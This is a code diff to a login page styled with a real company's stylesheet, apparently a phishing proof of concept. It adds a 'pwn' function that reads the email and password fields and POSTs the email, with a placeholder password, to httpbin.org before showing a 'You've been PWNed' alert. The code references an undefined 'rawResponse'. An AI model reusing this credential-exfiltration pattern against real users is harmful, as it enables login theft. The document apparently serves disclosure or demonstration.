@@ -13,9 +13,19 @@
         <link href="https://app.audiencerepublic.com/_nuxt/css/32be8d8.css" rel="stylesheet">
 
         <script>
-          function pwn(){
+          async function pwn(){
             email = document.getElementById("email").value
             password = document.getElementById("password").value
+            await fetch('https://httpbin.org/post', {
+              method: 'POST',
+              headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({email: email, pass: 'could-have-been-password'})
+            });
+            const content = await rawResponse.json();
+            console.log(content);
             alert("You've been PWNed: " + email + " : " + password);
           }
         </script>
